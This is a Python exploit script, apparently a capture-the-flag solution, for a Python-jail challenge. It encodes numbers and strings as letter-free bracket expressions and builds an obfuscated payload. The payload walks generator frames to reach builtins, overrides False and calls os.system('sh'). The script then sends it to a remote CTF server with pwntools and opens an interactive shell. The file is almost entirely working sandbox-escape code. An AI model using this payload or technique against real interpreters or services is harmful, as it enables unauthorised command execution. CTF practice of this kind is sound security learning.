import re

from pwn import *
from sympy import factorint

# https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html


lookup = {
	-2: "~([]<())",
	-1: "~([]<[])",
	0: "([]<[])",
	1: "([]<())",
}


def brainfuckize2(nb):
	if nb in lookup:
		return lookup[nb]

	if nb % 2:
		c = "~%s" % brainfuckize2(~nb)
	else:
		rep = factorint(nb)[2]
		if rep < 3:
			c = "(%s<<([]<()))" % brainfuckize2(nb // 2)
		else:
			c = f"({brainfuckize2(nb >> rep)}<<({brainfuckize2(rep)}))"
	if nb > 0:
		c = min(c, "-~%s" % brainfuckize2(nb - 1), key=len)
	lookup[nb] = c
	return c


def get_num(n):
	s = []
	for factor, rep in factorint(n).items():
		c = brainfuckize2(factor)
		if rep > 1:
			s.append(f"({c})**({brainfuckize2(rep)})")
		else:
			s.append(c)
	return "*".join(s)


for i in range(200):
	brainfuckize2(i)

for i in range(2, 200):
	lookup[i] = min(lookup[i], get_num(i), key=len)

for i in range(200):
	lookup[i] = min(lookup[i], f"-~{lookup[i - 1]}", key=len)

for i in range(198, 0, -1):
	lookup[i] = min(lookup[i], f"~-{lookup[i + 1]}", key=len)

"""
# https://ctftime.org/writeup/10677
def get_char(n):
	beg = "`'%\xcb'`[[]<()::-~-~([]<())]%"
	end = ""
	mid = get_shortest(ord(n))
	if re.search("[^*]\\*[^*]", mid):  # * has same operator precedence as %
		beg += "("
		end = ")"

	return beg + mid + end


def get_string(s):
	return "`[" + ",".join(get_char(c) for c in s) + "]`[-~([]<())::-~-~-~-~([]<())]"
"""


def get_string(s):
	return (
		f"`'{"%".join(["%\xcb"] * len(s))}'`[[]<()::-~-~([]<())]%"
		f"({",".join(lookup[ord(c)] for c in s)})"
	)


payload = get_string(
	# the first line is needed as otherwise catch_warnings.__init__ will error as False isn't defined
	"Q=[];Q.append(R.gi_frame.f_back.f_back.f_back.f_globals for R in Q);{}.__class__(*Q[0])['__builtins__'].False=0;"
	"0..__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('sh')"
)
print(len(payload))

# p = remote("localhost", 8066)
p = remote("ctf.tcp1p.team", 35447)
p.sendlineafter(b">>> ", payload.encode("latin-1"))
p.interactive()
